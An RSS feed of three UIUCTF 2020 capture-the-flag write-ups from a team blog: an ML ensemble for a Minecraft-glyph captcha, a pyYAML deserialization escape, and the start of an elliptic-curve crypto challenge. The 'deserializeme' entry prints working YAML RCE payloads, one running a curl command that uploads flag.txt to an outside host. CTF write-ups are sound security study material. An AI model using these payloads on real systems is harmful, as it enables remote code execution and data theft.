<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>uiuctf on Black Bauhinia</title>
    <link>https://b6a.black/tags/uiuctf/</link>
    <description>Black Bauhinia (uiuctf)</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Wed, 22 Jul 2020 18:55:00 +0800</lastBuildDate>
    
    <atom:link href="https://b6a.black/tags/uiuctf/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>UIUCTF 2020: Bot Protection IV</title>
      <link>https://b6a.black/posts/2020-07-22-uiuctf-bot-protection-iv/</link>
      <pubDate>Wed, 22 Jul 2020 18:55:00 +0800</pubDate>
      
      <guid>https://b6a.black/posts/2020-07-22-uiuctf-bot-protection-iv/</guid>
      <description>&lt;style&gt;
@font-face {
    font-family: &#39;minecraft-enchantment&#39;;
    src: url(&#39;/images/2020-07-22-uiuctf-bot-protection-iv/minecraft-enchantment.ttf&#39;);
}
&lt;/style&gt;

&lt;p&gt;&lt;font style=&#34;font-family: minecraft-enchantment;&#34;&gt;&lt;/p&gt;

&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://b6a.black/images/2020-07-22-uiuctf-bot-protection-iv/chall.jpg&#34; alt=&#34;&#34;&gt;&lt;/figure&gt;&lt;/p&gt;

&lt;p&gt;In this challenge, we have a website with captcha. Base on the question, we need to solve 500 captcha within 10 minutes. Very easy right?&lt;/p&gt;

&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://b6a.black/images/2020-07-22-uiuctf-bot-protection-iv/mainpage.jpg&#34; alt=&#34;&#34;&gt;&lt;/figure&gt;&lt;/p&gt;

&lt;p&gt;However, the language of this captcha is the &lt;a href=&#34;https://minecraft.gamepedia.com/Enchanting_Table#Standard_Galactic_Alphabet&#34;&gt;Standard Galactic Alphabet&lt;/a&gt; (Minecraft enchantment glyphs).&lt;/p&gt;

&lt;p&gt;The character mapping:&lt;/p&gt;

&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://b6a.black/images/2020-07-22-uiuctf-bot-protection-iv/charset.jpg&#34; alt=&#34;&#34;&gt;&lt;/figure&gt;&lt;/p&gt;

&lt;p&gt;From the source code, there is a curious comment:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!--TODO: we don&amp;#39;t need /captchas.zip anymore now that we dynamically create captchas. We should delete this file.--&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We are able to obtain ~70k samples &lt;a href=&#34;https://captcha.chal.uiuc.tf/captchas.zip&#34;&gt;here&lt;/a&gt; provided by the challenge author.&lt;/p&gt;

&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://b6a.black/images/2020-07-22-uiuctf-bot-protection-iv/unzip.jpg&#34; alt=&#34;&#34;&gt;&lt;/figure&gt;&lt;/p&gt;

&lt;p&gt;This is one of the sample captchas:&lt;/p&gt;

&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://b6a.black/images/2020-07-22-uiuctf-bot-protection-iv/UZNXF_54629.png&#34; alt=&#34;&#34;&gt;&lt;/figure&gt;&lt;/p&gt;

&lt;p&gt;With this dataset, I think everyone can think of using neural network to solve this challenge (I guess MNIST or captcha solving should be the first example you run in deep learning course, right?)&lt;/p&gt;

&lt;p&gt;From my experience, I know that it may not a good idea for me to debug/tune a neural network for doing computer vision work during a CTF. After some trial and error, I come across with this excellent github repo &lt;a href=&#34;https://github.com/nickliqian/cnn_captcha&#34;&gt;cnn_captcha&lt;/a&gt;. I also received a interactive script from my god like teammate @mystiz613.&lt;/p&gt;

&lt;p&gt;In order to use this code, you need to setup the config file (&lt;code&gt;conf/sample_config.json&lt;/code&gt;) properly. This is my configuration:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;{
  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;origin_image_dir&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/home/xxx/solve/captchas/&amp;#34;&lt;/span&gt;,
  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;new_image_dir&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/home/xxx/solve/new_train/&amp;#34;&lt;/span&gt;,
  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;train_image_dir&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/home/xxx/solve/train/&amp;#34;&lt;/span&gt;,
  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;test_image_dir&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/home/xxx/solve/test/&amp;#34;&lt;/span&gt;,
  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;api_image_dir&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sample/api/&amp;#34;&lt;/span&gt;,
  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;online_image_dir&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sample/online/&amp;#34;&lt;/span&gt;,
  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;local_image_dir&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sample/local/&amp;#34;&lt;/span&gt;,
  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;model_save_dir&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;model_v8/&amp;#34;&lt;/span&gt;,
  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;image_width&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;250&lt;/span&gt;,
  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;image_height&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt;,
  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;max_captcha&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;,
  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;image_suffix&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;png&amp;#34;&lt;/span&gt;,
  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;char_set&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;#34;&lt;/span&gt;,
  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;use_labels_json_file&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;,
  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;remote_url&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://127.0.0.1:6100/captcha/&amp;#34;&lt;/span&gt;,
  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;cycle_stop&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;20000&lt;/span&gt;,
  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;acc_stop&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;0.99&lt;/span&gt;,
  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;cycle_save&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;500&lt;/span&gt;,
  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;enable_gpu&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,
  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;train_batch_size&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;,
  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;test_batch_size&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;
}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&#34;first-attempt&#34;&gt;First attempt&lt;/h2&gt;

&lt;p&gt;With one &lt;em&gt;GeForce RTX 2080&lt;/em&gt;, I can train up a model with 99% accuracy within 1.5 hours. Here I didn&#39;t do a proper separate of train and test sets, but turns out this model saved me a lot later...&lt;/p&gt;

&lt;p&gt;This model mostly end up in level 30 to 40 and start to fail. Anyway, it is normal. With a 99% accuracy, we only have 0.6570% to survive up to lv 500 üôÅ&lt;/p&gt;

&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://b6a.black/images/2020-07-22-uiuctf-bot-protection-iv/model1.jpg&#34; alt=&#34;&#34;&gt;&lt;/figure&gt;&lt;/p&gt;

&lt;h2 id=&#34;second-attempt&#34;&gt;Second attempt&lt;/h2&gt;

&lt;p&gt;Here, I think of &lt;a href=&#34;https://en.wikipedia.org/wiki/Ensemble_learning&#34;&gt;Ensemble Learning&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://b6a.black/images/2020-07-22-uiuctf-bot-protection-iv/ensemble_learning.jpg&#34; alt=&#34;&#34;&gt;&lt;/figure&gt;&lt;/p&gt;

&lt;p&gt;The idea of ensemble learning is very simple. Assume we trained multiple classifer for the same classification problem, we create a classification base on multiple classifier to our input. We apply a similar concept here, but we hope any one of them could solve the captcha even the previous model fails to do. Originally, we think of bruteforce the top 2 decision of each character, but turns out it requires 32 query, which we may run out of time...&lt;/p&gt;

&lt;p&gt;To train up different models, I tried to play with the different parameters like batch size, size of evaluation set and different training set, etc.&lt;/p&gt;

&lt;p&gt;I also collected extra dataset by save those captcha we solved with only 1 model and denote as good set, those with more than 2 models as benign set. We feed these data to our training script to train new model and deploy it to collect more new samples. In total, we collected 120k samples and trained 8 models through this iterating process.&lt;/p&gt;

&lt;p&gt;The strategy for adding new samples to the dataset as follows, we tried to extend our dataset upto about 90k with both good set and benign set. And the last 20k is from the benign set. We also trained several models with different numbers of data samples during our data collection procedures.&lt;/p&gt;

&lt;p&gt;The best result with five models is 169 levels, while I can attain reach level 225 with eight models. For 5 models to 8 models ensemble, we improve from solving 40 level before fail to average solving 60 level. However, it still very far away from solving 500 within 10 minutes.&lt;/p&gt;

&lt;p&gt;At the end, my god like teammate @mystiz613 come up with an idea to solve as a hybird approach (DL model + human)... That is, if a captcha can&#39;t be solve with 8 of my models, I will do it myself...&lt;/p&gt;

&lt;p&gt;After 3 trials (once timeout at 495 lv, once at 365 lv), we succesfully capture the flag with ~90 second left by luck (manually solved ~10 times in total)...&lt;/p&gt;

&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://b6a.black/images/2020-07-22-uiuctf-bot-protection-iv/solved.jpg&#34; alt=&#34;&#34;&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;Level &lt;span style=&#34;color:#ae81ff&#34;&gt;497&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;is&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; high enough
Invalid captcha
Invalid captcha
Invalid captcha
Invalid captcha
Invalid captcha
Level &lt;span style=&#34;color:#ae81ff&#34;&gt;498&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;is&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; high enough
Level &lt;span style=&#34;color:#ae81ff&#34;&gt;499&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;is&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; high enough
uiuctf{i_knew_a_guy_in_highschool_that_could_read_this}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&#34;credits&#34;&gt;Credits&lt;/h2&gt;

&lt;p&gt;90% of work from @mystiz613, 10% from me.&lt;/p&gt;

&lt;h2 id=&#34;reflection&#34;&gt;Reflection&lt;/h2&gt;

&lt;p&gt;I guess there are better way to solve it with full automation right? After submitted the flag, I tried to do cause analysis why is such hard to solve with full automation (I know that I am too weak, please don&#39;t laugh at me üò≠). These are my observations:&lt;/p&gt;

&lt;h3 id=&#34;duplicate-characters&#34;&gt;Duplicate characters&lt;/h3&gt;

&lt;p&gt;Continuous duplicate character is hard to solve with my model.&lt;/p&gt;

&lt;p&gt;JGGSS:&lt;/p&gt;

&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://b6a.black/images/2020-07-22-uiuctf-bot-protection-iv/JGGSS.png&#34; alt=&#34;&#34;&gt;&lt;/figure&gt;&lt;/p&gt;

&lt;p&gt;YJKYY:&lt;/p&gt;

&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://b6a.black/images/2020-07-22-uiuctf-bot-protection-iv/YJKYY.png&#34; alt=&#34;&#34;&gt;&lt;/figure&gt;&lt;/p&gt;

&lt;h3 id=&#34;j-r-p-and-y&#34;&gt;J, R, P and Y&lt;/h3&gt;

&lt;p&gt;Due to similar shape to other characters or is formed by more than 2 components...&lt;/p&gt;

&lt;p&gt;YJKYY:&lt;/p&gt;

&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://b6a.black/images/2020-07-22-uiuctf-bot-protection-iv/YJKYY.png&#34; alt=&#34;&#34;&gt;&lt;/figure&gt;&lt;/p&gt;

&lt;p&gt;JPSCB:&lt;/p&gt;

&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://b6a.black/images/2020-07-22-uiuctf-bot-protection-iv/JPSCB.png&#34; alt=&#34;&#34;&gt;&lt;/figure&gt;&lt;/p&gt;

&lt;p&gt;FDSEJ:&lt;/p&gt;

&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://b6a.black/images/2020-07-22-uiuctf-bot-protection-iv/FDSEJ.png&#34; alt=&#34;&#34;&gt;&lt;/figure&gt;&lt;/p&gt;

&lt;p&gt;VJGJJ:&lt;/p&gt;

&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://b6a.black/images/2020-07-22-uiuctf-bot-protection-iv/VJGJJ.png&#34; alt=&#34;&#34;&gt;&lt;/figure&gt;&lt;/p&gt;

&lt;h3 id=&#34;similar-glyphs&#34;&gt;Similar glyphs&lt;/h3&gt;

&lt;p&gt;In fact, most of cases I solve manually the edit distance is between 1-2 characters and the problematic region are share by different models...&lt;/p&gt;

&lt;p&gt;For example PTJYZ:&lt;/p&gt;

&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://b6a.black/images/2020-07-22-uiuctf-bot-protection-iv/PTJYZ.png&#34; alt=&#34;&#34;&gt;&lt;/figure&gt;&lt;/p&gt;

&lt;p&gt;Option available:&lt;/p&gt;

&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://b6a.black/images/2020-07-22-uiuctf-bot-protection-iv/failure.jpg&#34; alt=&#34;&#34;&gt;&lt;/figure&gt;&lt;/p&gt;

&lt;hr&gt;

&lt;p&gt;That is it! Thanks for reading! :)&lt;/p&gt;

&lt;p&gt;&lt;/font&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>UIUCTF 2020: deserializeme</title>
      <link>https://b6a.black/posts/2020-07-22-uiuctf-deserializeme/</link>
      <pubDate>Wed, 22 Jul 2020 18:55:00 +0800</pubDate>
      
      <guid>https://b6a.black/posts/2020-07-22-uiuctf-deserializeme/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;Update: It was assigned as &lt;a href=&#34;https://access.redhat.com/security/cve/cve-2020-14343&#34;&gt;CVE-2020-14343&lt;/a&gt; after the contest.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This was a fun challenge exploiting a deserialize service in Python.&lt;/p&gt;

&lt;p&gt;The server is using &lt;a href=&#34;https://github.com/yaml/pyyaml/tree/5.3.1&#34;&gt;pyYAML&lt;/a&gt; and Flask, with the source code below:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python=&#34; data-lang=&#34;python=&#34;&gt;from flask import Flask, session, request, make_response
import yaml
import re
import os

app = Flask(__name__)
app.secret_key = os.urandom(16)

@app.route(&amp;#39;/&amp;#39;, methods=[&amp;#34;POST&amp;#34;])
def pwnme():
    if not re.fullmatch(b&amp;#34;^[\n --/-\]a-}]*$&amp;#34;, request.data, flags=re.MULTILINE):
        return &amp;#34;Nice try!&amp;#34;, 400
    return yaml.load(request.data)

if __name__ == &amp;#39;__main__&amp;#39;:
    app.run(host=&amp;#39;0.0.0.0&amp;#39;, port=8080)&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Bascially it is a service to do yaml.load() to your input and print it (return) with limitation to block some special character (especially &lt;code&gt;.&lt;/code&gt; and &lt;code&gt;_&lt;/code&gt;)&lt;/p&gt;

&lt;p&gt;The version of pyYAML and flask is both at latest release, so its not with an challenge with an existing CVE.&lt;/p&gt;

&lt;p&gt;We noticed that &lt;code&gt;yaml.load&lt;/code&gt; is &amp;quot;unsafe&amp;quot; by the README:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;When LibYAML bindings are installed, you may use fast LibYAML-based
parser and emitter as follows:

    &amp;gt;&amp;gt;&amp;gt; yaml.load(stream, Loader=yaml.CLoader)
    &amp;gt;&amp;gt;&amp;gt; yaml.dump(data, Dumper=yaml.CDumper)

If you don&amp;#39;t trust the input stream, you should use:

    &amp;gt;&amp;gt;&amp;gt; yaml.safe_load(stream)&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;So we dig into the internals of yaml loader.&lt;/p&gt;

&lt;p&gt;From the source code, when loader is not provided, it uses &lt;code&gt;FullLoader&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;load&lt;/span&gt;(stream, Loader&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;None):
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    Parse the first YAML document in a stream
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    and produce the corresponding Python object.
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    &amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; Loader &lt;span style=&#34;color:#f92672&#34;&gt;is&lt;/span&gt; None:
        load_warning(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;load&amp;#39;&lt;/span&gt;)
        Loader &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; FullLoader

    loader &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Loader(stream)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; loader&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get_single_data()
    &lt;span style=&#34;color:#66d9ef&#34;&gt;finally&lt;/span&gt;:
        loader&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dispose()&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And &lt;code&gt;FullLoader&lt;/code&gt; uses &lt;code&gt;FullConstructor&lt;/code&gt; to construct the python objects in:
&lt;a href=&#34;https://github.com/yaml/pyyaml/blob/5.3.1/lib3/yaml/constructor.py&#34;&gt;https://github.com/yaml/pyyaml/blob/5.3.1/lib3/yaml/constructor.py&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The differences of &lt;code&gt;FullConstructor&lt;/code&gt; and &lt;code&gt;UnsafeConstructor&lt;/code&gt; is, UnsafeConstructor can uses the yaml tag: &lt;code&gt;python/object/apply&lt;/code&gt; (that can be used to call functions) and it doesn&#39;t block some reserved keywords.&lt;/p&gt;

&lt;p&gt;From there, we guessed the challenge was to do an RCE using &lt;code&gt;python/object/new&lt;/code&gt; tag (that is available in FullConstructor) and somehow bypass the CVE-2020-1747 &lt;a href=&#34;https://github.com/yaml/pyyaml/pull/386&#34;&gt;fixes&lt;/a&gt;.
(With the POC &lt;a href=&#34;https://gist.github.com/adamczi/23a3b6d4bb7b2be35e79b0667d6682e1&#34;&gt;here&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;The CVE-2020-1747 exploits the fact that user can input a object with a customized &lt;code&gt;extend&lt;/code&gt; function, so that after the object is constructed (with &lt;code&gt;python/object/new&lt;/code&gt; / &lt;code&gt;python/object/apply&lt;/code&gt;), it can trigger the function &lt;code&gt;extend&lt;/code&gt; as it is used by the constructor as below:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;construct_python_object_apply&lt;/span&gt;(self, suffix, node, newobj&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;False):
        &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
        instance &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;make_python_instance(suffix, node, args, kwds, newobj)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; state:
            self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;set_python_instance_state(instance, state)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; listitems:
            instance&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;extend(listitems)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; dictitems:
            &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; key &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; dictitems:
                instance[key] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; dictitems[key]
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; instance&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;While the format of &lt;code&gt;python/object/apply&lt;/code&gt; can supply states for the object, we can use &lt;code&gt;python/name&lt;/code&gt; to reference a python internal function (exec, eval etc). We cannot use an module function as &lt;code&gt;.&lt;/code&gt; and &lt;code&gt;_&lt;/code&gt; is blocked, so the CVE PoC cannot be used. (and it used apply, which is blocked by &lt;code&gt;FullConstructor&lt;/code&gt;)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#   !!python/object/apply       # (or !!python/object/new)
#   args: [ ... arguments ... ]
#   kwds: { ... keywords ... }
#   state: ... state ...
#   listitems: [ ... listitems ... ]
#   dictitems: { ... dictitems ... }
# or short format:
#   !!python/object/apply [ ... arguments ... ]&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The 5.3.1 fixes also blocked the key &lt;code&gt;extend&lt;/code&gt; and &lt;code&gt;^__.*__$&lt;/code&gt; to disallow setting those key with the state parameter.&lt;/p&gt;

&lt;p&gt;We discovered that we can use &lt;code&gt;python/object/new&lt;/code&gt; with &lt;code&gt;type&lt;/code&gt; constructor (&lt;code&gt;type&lt;/code&gt; is a type...) to create new types with some customized internal state. With this, we can bypass the &lt;code&gt;state&lt;/code&gt; key block mechanism and freely set our object to something like this:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;!!python/object/new:type
  args: [&amp;#34;z&amp;#34;, !!python/tuple [], {&amp;#34;extend&amp;#34;: !!python/name:exec }]&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;With this we can put our commands to &lt;code&gt;listitems&lt;/code&gt;, and the constructor will call &lt;code&gt;instance.extend(listitems)&lt;/code&gt;, thus finish our RCE exploit.&lt;/p&gt;

&lt;p&gt;Full payload:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;!!python/object/new:type
  args: [&amp;#34;z&amp;#34;, !!python/tuple [], {&amp;#34;extend&amp;#34;: !!python/name:exec }]
  listitems: &amp;#34;\x5f\x5fimport\x5f\x5f(&amp;#39;os&amp;#39;)\x2esystem(&amp;#39;curl -POST mil1\x2eml/jm9 -F x=@flag\x2etxt&amp;#39;)&amp;#34;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;(We changed &lt;code&gt;_&lt;/code&gt; to &lt;code&gt;\x5f&lt;/code&gt; and &lt;code&gt;.&lt;/code&gt; to &lt;code&gt;\x2e&lt;/code&gt; to bypass the regex limitation)&lt;/p&gt;

&lt;p&gt;The intended solution uses &lt;code&gt;map&lt;/code&gt; as a type (as it is a type in Python 3):&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;!!python/object/new:tuple [!!python/object/new:map [!!python/name:eval , [ &amp;#39;PAYLOAD_HERE&amp;#39; ]]]&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This is essentially the python code &lt;code&gt;tuple(map(eval, &amp;quot;PAYLOAD&amp;quot;)))&lt;/code&gt;, and this works as &lt;code&gt;map&lt;/code&gt; and &lt;code&gt;tuple&lt;/code&gt; are both class constructor (so it doesnt use any function as apply calls).&lt;/p&gt;

&lt;p&gt;Thanks for the author for such cool challenge (basically used a 0day for the CTF challenge).&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>UIUCTF 2020: nookcrypt</title>
      <link>https://b6a.black/posts/2020-07-22-uiuctf-nookcrypt/</link>
      <pubDate>Wed, 22 Jul 2020 18:55:00 +0800</pubDate>
      
      <guid>https://b6a.black/posts/2020-07-22-uiuctf-nookcrypt/</guid>
      <description>&lt;h2 id=&#34;challenge-summary&#34;&gt;Challenge Summary&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;Tom Nook is testing a new encryption scheme for nookphones, but it seems to be a bit faulty... can you break it?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;em&gt;nookcrypt&lt;/em&gt; is a netcat service that have no source code released. There are two functions exposed:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Gets an encrypted copy of the flag (and the message &lt;code&gt;hello world&lt;/code&gt;).&lt;/li&gt;
&lt;li&gt;Encrypts an arbitrary message.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;For example, this is what I had when trying out the options:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Option: 1
enc(FLAG) = (0xf31ce7cb1f2c6e7107318d76bdda50c5, 0x02d979fc3122bbaffcc1111953bc184f)
enc(&amp;#39;hello world&amp;#39;) = (0x4cf5afcc9bc1db0118172129b713d86a, 0xe41d8761370768aa9694b164c843dde9)

Option: 2
msg: hello world
enc(0x68656c6c6f20776f726c64) = (0x4cf5afcc9bc1db0118172129b713d86a, 0xe41d8761370768aa9694b164c843dde9)&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Since the response is consistent after reconnecting to the netcat service for multiple times, I assume that the parameters are constant.&lt;/p&gt;

&lt;h2 id=&#34;solution&#34;&gt;Solution&lt;/h2&gt;

&lt;h3 id=&#34;part-i-recovering-the-curve-parameters-in-a-stupid-way&#34;&gt;Part I: Recovering the curve parameters in a stupid way&lt;/h3&gt;

&lt;p&gt;Since it is mentioning elliptic curves in its services, the first thing I was doing is to recover the parameters, namely, $a$, $b$ and $p$ for the elliptic curve $y^2 \equiv x^3 + ax + b\ (\text{mod}\ p)$.&lt;/p&gt;

&lt;p&gt;My attempt is to encrypt a bunch of messages:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;msg: a
enc(0x61) = (0xb2d6c27a99b52aec6e243d4e4f67cb71, 0x9dfa2bd87ea1e09388493137132cc534)

msg: b
enc(0x62) = (0x99b8150ebf23c69ee1056f0e329496ae, 0xe1febe35a5877f00f3876c2a24fb9164)

msg: c
enc(0x63) = (0x3e7ef6d1106382119a0fa8c966f6d1df, 0x89d81b9fab5336a227414491881bbee8)

msg: d
enc(0x64) = (0x985dbb38a65f4e69bfc602d7e114cad9, 0xcad1cb62a3d30b05093575f3a22f7e3c)

...&lt;/code&gt;&lt;/pre&gt;
